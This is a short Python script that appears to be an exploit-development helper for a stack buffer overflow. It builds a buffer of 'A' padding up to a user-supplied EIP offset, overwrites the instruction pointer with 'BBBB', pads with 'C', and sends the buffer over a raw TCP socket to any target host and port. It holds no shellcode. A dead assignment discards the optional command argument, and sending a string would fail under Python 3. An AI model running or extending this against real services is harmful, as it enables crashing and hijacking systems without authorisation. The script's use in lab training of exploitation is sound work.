#!/usr/bin/python

import socket
import time
import sys

if len(sys.argv) < 5:
    print("usage: \"./target.py [target] [port] [size] [eip]\"")
    exit(0)


target = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
eip = int(sys.argv[4])

if len(sys.argv) == 6:
    cmd = sys.argv[5] + " "
else:
    cmd = ""

cmd = ""

inputBuffer = cmd + "A" * eip + "B" * 4 + "C" * (size-eip-len(cmd))

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target,port))
print("sending buffer")
s.send(inputBuffer)
s.close()
exit(0)
     



